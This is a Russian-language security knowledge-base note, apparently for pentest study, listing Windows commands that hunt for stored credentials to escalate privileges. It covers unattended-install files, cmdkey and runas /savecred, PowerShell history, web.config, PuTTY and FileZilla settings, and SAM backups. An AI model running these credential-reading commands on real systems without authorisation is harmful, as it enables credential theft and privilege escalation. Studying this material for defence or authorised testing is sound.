---
title: "Повышение привилегий в Windows машинах поиск паролей"
id: note-42
created: "03.02.2026 09:29"
category: "07_Windows и Active Directory"
tags:
  - иб/windows
  - ad
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `07_Windows и Active Directory` · Дата: `03.02.2026 09:29`

# Повышение привилегий в Windows машинах поиск паролей

Быстрая проверка
Всё за 30 секунд
cmdkey /list && echo. && \
dir C:\Windows\Panther\Unattend.xml 2>nul && echo. && \
type "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" 2>nul

One-liner для PowerShell
Get-ChildItem C:\ -Include *unattend*.xml -Recurse -ErrorAction SilentlyContinue; \
Get-Content "$Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Tail 20

Основные места

1. Unattended Install Files
dir C:\*.xml /s /b | findstr -i unattend
type C:\Windows\Panther\Unattend.xml 2>nul
ищем: <Password>, <Credentials>
2. Сохранённые учётные данные
cmdkey /list
runas /savecred /user:Администратор cmd.exe
3. История PowerShell
type "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
Примечание: Команда выше будет работать только от cmd.exe, так как Powershell не узнает %userprofile%В качестве экологической переменной. Чтобы прочитать файл из Powershell, вам придется заменить %userprofile%с $Env:userprofile. 
4. Web.config (IIS)
type C:\inetpub\wwwroot\web.config 2>nul | findstr -i "password connectionString"
Быстрая проверка
Всё за 30 секунд
cmdkey /list && echo. && \
dir C:\Windows\Panther\Unattend.xml 2>nul && echo. && \
type "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" 2>nul
5. PuTTY (SSH клиент)
reg query HKCU\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
Proxy пароли
6. Текстовые файлы
findstr /si "password pass pwd" *.txt *.ini *.config *.xml *.log
Пароли в конфигах
7. SAM бэкапы
dir C:\Windows\System32\config\SAM.bak 2>nul
dir C:\Windows\repair\SAM 2>nul
Хэши паролей системы
8. FileZilla
type "%APPDATA%\FileZilla\recentservers.xml" 2>nul
FTP пароли
